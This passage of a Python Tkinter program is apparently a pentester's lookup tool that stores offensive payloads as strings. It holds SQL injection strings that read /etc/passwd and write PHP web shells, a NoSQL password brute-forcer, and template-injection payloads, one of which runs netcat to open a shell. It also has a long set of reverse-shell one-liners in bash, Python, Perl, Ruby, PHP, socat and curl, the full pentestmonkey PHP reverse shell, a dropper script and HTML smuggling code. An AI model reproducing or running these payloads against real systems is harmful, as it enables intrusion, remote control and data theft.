cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- - 	Find if all user privileges
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- - 	Find which directories can be accessed through MySQL
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
File Injection
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 	
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- - 	Read local file
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
select 'file written successfully!' into outfile '/var/www/html/proof.txt' 	Write a string to a local file
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- - 	Write a web shell into the base web directory
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
'''

sqlmap_websocket = '''										𝗛𝗧𝗧𝗣 𝗦𝗲𝗿𝘃𝗲𝗿 𝘀𝗰𝗿𝗶𝗽𝘁 𝘁𝗵𝗮𝘁 𝘄𝗶𝗹𝗹 𝗿𝗲𝗰𝗲𝗶𝘃𝗲 𝘁𝗵𝗲 𝗦𝗤𝗟𝗠𝗮𝗽 𝗽𝗮𝘆𝗹𝗼𝗮𝗱 𝘃𝗶𝗮 𝗚𝗘𝗧 𝗽𝗮𝗿𝗮𝗺𝗲𝘁𝗲𝗿

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

𝗜𝘁 𝗶𝘀 𝘀𝗶𝗺𝗶𝗹𝗮𝗿 𝘁𝗼 𝗦𝗤𝗟𝗠𝗮𝗽 𝘁𝗮𝗺𝗽𝗲𝗿 𝘀𝗰𝗿𝗶𝗽𝘁𝘀 𝗯𝘂𝘁 𝗶𝗻 𝘁𝗵𝗶𝘀 𝗰𝗮𝘀𝗲 𝘁𝗵𝗲 𝘀𝗰𝗿𝗶𝗽𝘁 𝘄𝗶𝗹𝗹 𝗮𝗰𝘁 𝗮𝘀 𝗮 𝘀𝘁𝗮𝗻𝗱𝗮𝗹𝗼𝗻𝗲 𝘀𝗲𝗿𝘃𝗲𝗿 𝘃𝘂𝗹𝗻𝗲𝗿𝗮𝗯𝗹𝗲 𝘁𝗼 𝗦𝗤𝗟𝗶 𝗼𝗻 𝗚𝗘𝗧 𝗽𝗮𝗿𝗮𝗺𝗲𝘁𝗲𝗿. 𝗛𝗲𝗿𝗲 𝗶𝘀 𝘁𝗵𝗲 𝗳𝘂𝗹𝗹 𝗣𝘆𝘁𝗵𝗼𝗻𝟯 𝘀𝗰𝗿𝗶𝗽𝘁 𝗰𝗿𝗲𝗮𝘁𝗲𝗱 𝗳𝗼𝗿 𝘁𝗵𝗲 𝘃𝘂𝗹𝗻𝗲𝗿𝗮𝗯𝗹𝗲 𝘄𝗲𝗯 𝗮𝗽𝗽


from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection

ws_server = "ws://localhost:8156/ws"

def send_ws(payload):
	ws = create_connection(ws_server)
	# If the server returns a response on connect, use below line	
	#resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
	
	# For our case, format the payload in JSON
	message = unquote(payload).replace('"','\\'') # replacing " with ' to avoid breaking JSON structure
	data = '{"employeeID":"%s"}' % message

	ws.send(data)
	resp = ws.recv()
	ws.close()

	if resp:
		return resp
	else:
		return ''

def middleware_server(host_port,content_type="text/plain"):

	class CustomHandler(SimpleHTTPRequestHandler):
		def do_GET(self) -> None:
			self.send_response(200)
			try:
				payload = urlparse(self.path).query.split('=',1)[1]
			except IndexError:
				payload = False
				
			if payload:
				content = send_ws(payload)
			else:
				content = 'No parameters specified!'

			self.send_header("Content-type", content_type)
			self.end_headers()
			self.wfile.write(content.encode())
			return

	class _TCPServer(TCPServer):
		allow_reuse_address = True

	httpd = _TCPServer(host_port, CustomHandler)
	httpd.serve_forever()


print("[+] Starting MiddleWare Server")
print("[+] Send payloads in http://localhost:8081/?id=*")

try:
	middleware_server(('0.0.0.0',8081))
except KeyboardInterrupt:
	pass
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

𝗧𝗵𝗲 𝘀𝗰𝗿𝗶𝗽𝘁 𝘄𝗶𝗹𝗹 𝗰𝗿𝗲𝗮𝘁𝗲 𝗮𝗻 𝗛𝗧𝗧𝗣 𝗦𝗲𝗿𝘃𝗲𝗿 𝗼𝗻 𝗽𝗼𝗿𝘁 𝟴𝟬𝟴𝟭 𝗮𝗻𝗱 𝗲𝘅𝘁𝗿𝗮𝗰𝘁 𝗳𝗶𝗿𝘀𝘁 𝗚𝗘𝗧 𝗽𝗮𝗿𝗮𝗺𝗲𝘁𝗲𝗿 𝘃𝗮𝗹𝘂𝗲, 𝘀𝗲𝗻𝗱 𝘁𝗵𝗲 𝘃𝗮𝗹𝘂𝗲 𝘁𝗼  𝘀𝗲𝗻𝗱_𝘄𝘀  𝗳𝘂𝗻𝗰𝘁𝗶𝗼𝗻 𝘄𝗵𝗲𝗿𝗲 𝗶𝘁 𝘄𝗶𝗹𝗹 𝗯𝗲 𝗳𝗼𝗿𝗺𝗮𝘁𝗲𝗱 𝗮𝘀 𝗮 𝗝𝗦𝗢𝗡 𝗺𝗲𝘀𝘀𝗮𝗴𝗲 𝗮𝘀 𝗿𝗲𝗾𝘂𝗶𝗿𝗲𝗱 𝗯𝘆 𝘁𝗵𝗲 𝘃𝘂𝗹𝗻𝗲𝗿𝗮𝗯𝗹𝗲 𝘄𝗲𝗯 𝗮𝗽𝗽.
𝗜𝘁 𝘄𝗶𝗹𝗹 𝘁𝗵𝗲𝗻 𝗲𝘀𝘁𝗮𝗯𝗹𝗶𝘀𝗵 𝗮 𝗪𝗲𝗯𝗦𝗼𝗰𝗸𝗲𝘁 𝗰𝗼𝗻𝗻𝗲𝗰𝘁𝗶𝗼𝗻 𝘁𝗼 𝘁𝗵𝗲 𝘀𝗲𝗿𝘃𝗲𝗿 𝗲𝗻𝗱𝗽𝗼𝗶𝗻𝘁 𝗺𝗲𝗻𝘁𝗶𝗼𝗻𝗲𝗱 𝗶𝗻  𝘄𝘀_𝘀𝗲𝗿𝘃𝗲𝗿  𝘃𝗮𝗿𝗶𝗮𝗯𝗹𝗲 𝗮𝗻𝗱 𝘀𝗲𝗻𝗱 𝘁𝗵𝗲 𝗽𝗮𝘆𝗹𝗼𝗮𝗱.

𝗡𝗼𝘄 𝘁𝗼 𝘁𝗲𝘀𝘁 𝗼𝘂𝘁 𝗼𝘂𝗿 𝗺𝗶𝗱𝗱𝗹𝗲-𝘄𝗮𝗿𝗲 𝘀𝗲𝗿𝘃𝗲𝗿 𝗶𝗻 𝗮𝗰𝘁𝗶𝗼𝗻, 𝗜’𝗹𝗹 𝗳𝗶𝗿𝘀𝘁 𝗵𝗼𝘀𝘁 𝘁𝗵𝗲 𝘃𝘂𝗹𝗻𝗲𝗿𝗮𝗯𝗹𝗲 𝘄𝗲𝗯 𝗮𝗽𝗽 𝗮𝗻𝗱 𝗹𝗮𝘂𝗻𝗰𝗵 𝘁𝗵𝗲 𝗮𝗯𝗼𝘃𝗲 𝘀𝗰𝗿𝗶𝗽𝘁 𝗶𝗻 𝗮 𝘁𝗲𝗿𝗺𝗶𝗻𝗮𝗹. 𝗧𝗵𝗲𝗻 𝗲𝘅𝗲𝗰𝘂𝘁𝗲 𝗦𝗤𝗟𝗠𝗮𝗽 𝗮𝗴𝗮𝗶𝗻𝘀𝘁 𝘁𝗵𝗲 𝗺𝗶𝗱𝗱𝗹𝗲-𝘄𝗮𝗿𝗲 𝘀𝗲𝗿𝘃𝗲𝗿 𝗵𝗼𝘀𝘁𝗲𝗱 𝗼𝗻 𝗽𝗼𝗿𝘁 𝟴𝟬𝟴𝟭:

sqlmap -u "http://localhost:8081/?id=1" --batch --dbs

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
'''


nosqli = '''                           		 		  	    					      			𝗡𝗼𝗦𝗤𝗟 𝗶𝗻𝗷𝗲𝗰𝘁𝗶𝗼𝗻
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[ 𝗥𝗲𝘁𝗿𝗶𝗲𝘃𝗲 𝗽𝗮𝘀𝘀𝘄𝗼𝗿𝗱 ]

#!/usr/bin/env python3
import re
import requests
import string

chars = string.ascii_letters + string.digits + string.punctuation
password = ""
url = ""
done = False

while not done:
    done = True
    for c in chars:
        data = {
            "username": "",
            "password[$regex]": f"^{re.escape(password+c)}.*$",
            "login": "login"
        }
        r = requests.post(url, data=data, allow_redirects=False)
        if r.status_code == 302:     
            done = False       
            password += c
            print(f"[+] Found {c}")
print(f"[+] Password: {password}")

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

[ JSON POST request]

import json
import requests
import string
import sys

url = 'http://10.10.11.139:5000/login'
def login(pw):
	payload = '{ "$regex": "%s" }' % pw
	data = { "user": "admin","password":json.loads(payload) }
	r = requests.post(url,json=data)
	if 'Invalid Password' in r.text:
		return False
	return True

password = '^'
stop = False
while stop == False:
	for i in string.ascii_letters:
		sys.stdout.write(f'\\r{password}{i}')
		if login(f'{password}{i}'):
			password += i
			if login(f"{password}$"):
				sys.stdout.write(f'\\r{password}\\r\\n')
				sys.stdout.flush()
				stop = True
				break
			break


'''

read_cmd_out_into_cookie = '''
?a=somevalue&name={%%20if%20session.update({request.args.a:%20True})%20%}{%endif%}
?a=os&b=ls&name={% if session.update({request.application.__globals__.__builtins__.__import__(request.args.a).popen(request.args.b).read(): True}) %}{%endif%}
'''


py_rce = ''' [𝗽𝗮𝘆𝗹𝗼𝗮𝗱 𝟭]\n
{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}

[𝗽𝗮𝘆𝗹𝗼𝗮𝗱 𝟮]

{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("nc.traditional 10.10.14.188 2000 -e /bin/sh").read()}}{%endif%}{% endfor %}

'''

dump_mssql = '''                           		 		  	    					      			𝗗𝘂𝗺𝗽 𝗠𝗦𝗦𝗤𝗟 𝗗𝗮𝘁𝗮𝗯𝗮𝘀𝗲\n
SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES;
'''

html_smuggling = '''                           		 		  	    					      			𝗔𝗯𝘂𝘀𝗲𝘀 𝗛𝗧𝗠𝗟𝟱 𝗮𝗻𝗰𝗵𝗼𝗿 𝗮𝘁𝘁𝗿𝗶𝗯𝘂𝘁𝗲 𝘁𝗼 𝗮𝘂𝘁𝗼𝗺𝗮𝘁𝗶𝗰𝗮𝗹𝗹𝘆 𝗱𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗮 𝗳𝗶𝗹𝗲

<html>
<body>
    <script>
        function base64ToArrayBuffer(base64){
          var binary_string = window.atob(base64);
          var len = binary_string.length;
          var bytes = new Uint8Array(len);
          for (var i=0;i<len;i++) { bytes[i] = binary_string.charCodeAt(i); }
          return bytes.buffer;
        }
        
        var file = 'eGN0Cg=='
        var blob = new Blob([base64ToArrayBuffer(file)], {type: 'octet/stream'});
        var fileName = "xct.txt"

        // Edge
        if(navigator.msSaveBlob) {
    		  navigator.msSaveBlob(blob,fileName);
    	  // Other Browsers
    	  } else {    
	        var a = document.createElement('a');
	        document.body.appendChild(a);
	        a.style = 'display: none';
	        var url = window.URL.createObjectURL(blob);
	        a.href = url;
	        a.download = fileName;
	        a.click();
	        window.URL.revokeObjectURL(url);
	    }
    </script>
</body>
</html>
'''


rev_shell = '''                           		 		  	    					      			𝗥𝗲𝘃𝗲𝗿𝘀𝗲 𝗦𝗵𝗲𝗹𝗹𝘀\n
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

[ 𝗻𝗲𝘁𝗰𝗮𝘁 - 𝗺𝗸𝗳𝗶𝗳𝗼 ]

rm /tmp/x; mkfifo /tmp/x; cat /tmp/x | /bin/sh -i 2>&1 | nc 10.10.10.10 1337 > /tmp/x
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

[ 𝗰𝗨𝗥𝗟 𝘀𝗵𝗲𝗹𝗹 ]

{ curl -sNkT . http://10.10.10.10:1337 </dev/fd/3| sh 3>&-;} 3>&1|:

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

[ 𝗯𝗮𝘀𝗵 ]

/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1'

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

[ 𝗽𝘆𝘁𝗵𝗼𝗻𝟯 ]

python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.10.10",1337));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[ 𝘀𝗼𝗰𝗮𝘁 ]

socat TCP:10.10.10.10:1337 EXEC:'sh',pty,stderr,setsid,sigint,sane

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

[ 𝗽𝗲𝗿𝗹 ]

perl -e 'use Socket;$i="10.10.10.10";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

[ 𝗿𝘂𝗯𝘆 ]

ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.10.10",1337))'

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

[ 𝗽𝗵𝗽 ]

php -r '$sock=fsockopen("10.10.10.10",1337);exec("sh <&3 >&3 2>&3");'

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

[ 𝗻𝗼𝗱𝗲.𝗷𝘀 ]

require('child_process').exec('nc -e sh 10.10.10.10 1337')

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
'''

php_rev = '''
<?php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.10.10';
$port = 4444;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w") 
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
'''

x = """
# 1. On your machine:
#      nc -l 1337
#
# 2. On the target machine:
#      curl https://resh.now.sh/yourip:1337 | sh
#
# 3. Don't be a dick
#
# Payload:
#      curl https://resh.now.sh/10.10.10.10:4444 | sh

if command -v python > /dev/null 2>&1; then
	python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.10.10.10",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
	exit;
fi

if command -v perl > /dev/null 2>&1; then
	perl -e 'use Socket;$i="10.10.10.10";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
	exit;
fi

if command -v nc > /dev/null 2>&1; then
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f
	exit;
fi

if command -v sh > /dev/null 2>&1; then
	/bin/sh -i >& /dev/tcp/10.10.10.10/4444 0>&1
	exit;
fi

if command -v php > /dev/null 2>&1; then
	php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
	exit;
fi

if command -v ruby > /dev/null 2>&1; then
	ruby -rsocket -e'f=TCPSocket.open("10.10.10.10",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
	exit;
fi

if command -v lua > /dev/null 2>&1; then
	lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.10.10.10','4444');os.execute('/bin/sh -i <&3 >&3 2>&3');"
	exit;
fi
"""

php_eval_code = '''                           		 		  	    					      			𝗘𝘃𝗮𝗹 𝗖𝗼𝗱𝗲 𝗜𝗻𝗷𝗲𝗰𝘁𝗶𝗼𝗻
${system($_GET[1])}&1=ls
'''


sqli_to_rce = '''

𝗧𝗵𝗲 𝗳𝗶𝗿𝘀𝘁 𝘁𝗵𝗶𝗻𝗴 𝘄𝗲 𝗱𝗼 𝗶𝘀 𝗰𝗵𝗲𝗰𝗸 𝘄𝗵𝗲𝗿𝗲 𝘁𝗵𝗲 𝘀𝗾𝗹 𝗶𝘀 𝗿𝘂𝗻𝗻𝗶𝗻𝗴 𝗼𝗻 𝘁𝗵𝗲 𝘀𝗲𝗿𝘃𝗲𝗿. 𝗧𝗵𝗶𝘀 𝗶𝘀 𝗱𝗼𝗻𝗲 𝗯𝘆 𝗶𝗻𝗷𝗲𝗰𝘁𝗶𝗻𝗴 𝘁𝗵𝗲 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 @@datadir 𝗶𝗻𝘁𝗼 𝘁𝗵𝗲 𝘀𝗾𝗹 𝗾𝘂𝗲𝗿𝘆 𝘁𝗼 𝗴𝗲𝘁 𝘁𝗵𝗲 𝗳𝘂𝗹𝗹 𝗽𝗮𝘁𝗵 𝗼𝗳 𝗶𝘁𝘀 𝗹𝗼𝗰𝗮𝘁𝗶𝗼𝗻 𝗼𝗻 𝘁𝗵𝗲 𝘀𝗲𝗿𝘃𝗲𝗿

𝗔𝘀𝘀𝘂𝗺𝗶𝗻𝗴 𝘄𝗲 𝗳𝗼𝘂𝗻𝗱 𝗮 𝗿𝗲𝗳𝗹𝗲𝗰𝘁𝗶𝗼𝗻 𝗶𝗻 𝘁𝗵𝗲 𝘀𝗲𝗰𝗼𝗻𝗱 𝗰𝗼𝗹𝘂𝗺𝗻 𝘄𝗲 𝘄𝗶𝗹𝗹 𝗲𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗳𝗼𝗹𝗹𝗼𝘄𝗶𝗻𝗴 𝗽𝗮𝘆𝗹𝗼𝗮𝗱

𝗲𝘅𝗮𝗺𝗽𝗹𝗲 𝗶𝗻𝗽𝘂𝘁:

'union select 1,@@datadir,3,4 --


𝗼𝘂𝘁𝗽𝘂𝘁:

/var/www/html

𝗖𝗿𝗲𝗮𝘁𝗲 𝗮 𝗳𝗶𝗹𝗲 𝗮𝗻𝗱 𝗮𝗰𝗰𝗲𝘀𝘀 𝗶𝘁 𝗳𝗿𝗼𝗺 𝘁𝗵𝗲 𝘀𝗲𝗿𝘃𝗲𝗿 𝘄𝗲 𝘄𝗶𝗹𝗹 𝗻𝗲𝗲𝗱 𝘁𝗼 𝗰𝗿𝗲𝗮𝘁𝗲 𝗶𝘁 𝗶𝗻 /var/www/html

𝗔𝗰𝗰𝗼𝗿𝗱𝗶𝗻𝗴 𝘁𝗼 𝘁𝗵𝗶𝘀 𝗶𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻, 𝗶𝘁’𝘀 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗽𝗼𝘀𝘀𝗶𝗯𝗹𝗲 𝘁𝗼 𝗰𝗿𝗲𝗮𝘁𝗲 𝘁𝗵𝗲 𝗽𝗮𝘆𝗹𝗼𝗮𝗱 𝗳𝗼𝗿 𝘁𝗵𝗲 𝘀𝗵𝗲𝗹𝗹

'union select 1,<php_payload>,3,4 into outfile <path> --

'union select 1,'<?php system($_GET["cmd"]); ?>',3,4 into outfile '/var/www/html/rce.php' --

𝗜𝗳 𝗲𝘃𝗲𝗿𝘆𝘁𝗵𝗶𝗻𝗴 𝘄𝗼𝗿𝗸𝘀 𝗽𝗲𝗿𝗳𝗲𝗰𝘁𝗹𝘆. 𝗪𝗲 𝘀𝗵𝗼𝘂𝗹𝗱 𝗮𝗯𝗹𝗲 𝘁𝗼 𝗽𝗲𝗿𝗳𝗼𝗿𝗺 𝗿𝗲𝗺𝗼𝘁𝗲 𝗰𝗼𝗱𝗲 𝗲𝘅𝗲𝗰𝘂𝘁𝗶𝗼𝗻 𝗯𝘆 𝗹𝗶𝗸𝗲 𝘁𝗵𝗶𝘀


http://<host>/rce.php?cmd=<command>

'''

def get():
	entry_value = entry.get().lower()
	if 'lxd' in entry_value or 'lxc' in entry_value:
		answer_value = lxd
	elif 'bypass file upload filter' in entry_value or 'bypass file upload' in entry_value:
		answer_value = bfuf
	elif 'bypass 401' in entry_value or 'bypass 403' in entry_value or '401 bypass' in entry_value or '403 bypass' in entry_value or '401/403 bypass' in entry_value or '403/401 bypass' in entry_value:
		answer_value = bypass401_403
	elif 'password reset' in entry_value or 'password' in entry_value and 'reset' in entry_value:
		answer_value = test_pass_reset
	elif 'php filter' in entry_value:
		answer_value = php_filter
	elif 'keyboard' in entry_value:
		answer_value = keyboard 
	elif 'curl' in entry_value:
		answer_value = curl
	elif 'ssti' in entry_value:
		answer_value = ssti_payloads
	elif 'xss' in entry_value and 'payloads' in entry_value:
		answer_value = xss_payloads
	elif 'xss' in entry_value and 'polyglot' in entry_value:
		answer_value = xss_polyglot
	elif 'xss' in entry_value and 'lfi' in entry_value:
		answer_value = xss_to_lfi
	elif 'xss' and 'dork' in entry_value:
		answer_value = xss_dorks
	elif 'subdomain' in entry_value:
		answer_value = find_subdomains
	elif 'api' and 'endpoint' in entry_value:
		answer_value = api_endpoint_bypass
	elif 'open' and 'redirect' in entry_value:
		answer_value = open_redirect
	elif 'hydra' in entry_value:
		answer_value = hydra
	elif 'xxe' and 'protocol' in entry_value:
		answer_value = xxe_protocols
	elif 'xxe' in entry_value:
		answer_value = xxe
	elif 'ssrf' in entry_value or 'server side request forgery' in entry_value:
		answer_value = ssrf
	elif 'csrf' in entry_value:
		answer_value = csrf
	elif 'lfi' in entry_value:
		answer_value = lfi
	elif 'mysql' in entry_value:
		answer_value = mysql
	elif 'nosql' in entry_value:
		answer_value = nosqli
	elif 'read command output into cookie' in entry_value:
		answer_value = read_cmd_out_into_cookie
	elif 'python' in entry_value and 'rce' in entry_value:
		answer_value = py_rce
	elif 'mssql' in entry_value:
		answer_value = dump_mssql
	elif 'html smuggling' in entry_value:
		answer_value = html_smuggling
	elif entry_value == 'x':
		answer_value = x
	elif 'reverse shell' in entry_value:
		answer_value = rev_shell
	elif 'php' in entry_value and 'shell' in entry_value:
		answer_value = php_rev
	elif 'php eval' in entry_value or 'eval' in entry_value:
		answer_value = php_eval_code
	elif 'sql' in entry_value and 'rce' in entry_value:
		answer_value = sqli_to_rce
	elif 'sql' in entry_value:
		answer_value = sqli
	elif 'sqlmap' in entry_value and 'websocket' in entry_value:
		answer_value = sqlmap_websocket


	answer.delete(1.0, END)
	try:
		answer.insert(INSERT, answer_value)
	except(NameError):
		answer.insert(INSERT, '                           		 		  	    					      			𝟎_𝟎 𝐒𝐨𝐫𝐫𝐲, 𝐢𝐧𝐩𝐮𝐭 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝 𝟎_𝟎')
root = Tk()

topframe = Frame(root)

entry =  Entry(topframe,width=100,borderwidth=2,bg='grey',fg='black')
entry.pack(side=LEFT)

topframe.pack(side = TOP)
buttomframe = Frame(root)

button = Button(topframe, text="search", command=get)
button.pack()

scroll = Scrollbar(buttomframe)
scroll.pack(side=RIGHT,fill=Y)
answer = Text(buttomframe, width=240, height=60, yscrollcommand=scroll.set)
scroll.config(command=answer.yview)
# banner
answer.insert(INSERT, '''\n\n\n\n\n\n\n\n\n

\t\t\t\t\t\t\t\t██   █  █▀ █▄▄▄▄ ▄███▄   ▄█▄     ▄  █       ▄ ▄   ██      ▄▄▄▄▄        ▄  █ ▄███▄   █▄▄▄▄ ▄███▄   
\t\t\t\t\t\t\t\t█ █  █▄█   █  ▄▀ █▀   ▀  █▀ ▀▄  █   █      █   █  █ █    █     ▀▄     █   █ █▀   ▀  █  ▄▀ █▀   ▀  
\t\t\t\t\t\t\t\t█▄▄█ █▀▄   █▀▀▌  ██▄▄    █   ▀  ██▀▀█     █ ▄   █ █▄▄█ ▄  ▀▀▀▀▄       ██▀▀█ ██▄▄    █▀▀▌  ██▄▄    
\t\t\t\t\t\t\t\t█  █ █  █  █  █  █▄   ▄▀ █▄  ▄▀ █   █     █  █  █ █  █  ▀▄▄▄▄▀        █   █ █▄   ▄▀ █  █  █▄   ▄▀ 
\t\t\t\t\t\t\t\t   █   █     █   ▀███▀   ▀███▀     █       █ █ █     █                   █  ▀███▀     █   ▀███▀   
\t\t\t\t\t\t\t\t  █   ▀     ▀                     ▀         ▀ ▀     █                   ▀            ▀            
\t\t\t\t\t\t\t\t ▀                                                 ▀
	''')
answer.pack()

buttomframe.pack()

def update():
	r = requests().get(url='https://akr3ch.github.io/hackit/main/hackit')
	answer.insert(INSERT,r.text)


def about():
	webview.create_window('akrech', 'https://akr3ch.github.io')
	webview.start()


# create a menu
menubar = Menu(root)
# create a sub-menu
menu = Menu(menubar, tearoff=0)
menubar.add_cascade(label="Menu", menu=menu)
menu.add_command(label="Update",command=update)
menu.add_command(label="About", command=about)
menu.add_command(label="Exit", command=root.quit)


root.config(menu=menubar)
root.title("💀𝗵𝗮𝗰𝗸𝗶𝘁💀")

root.mainloop()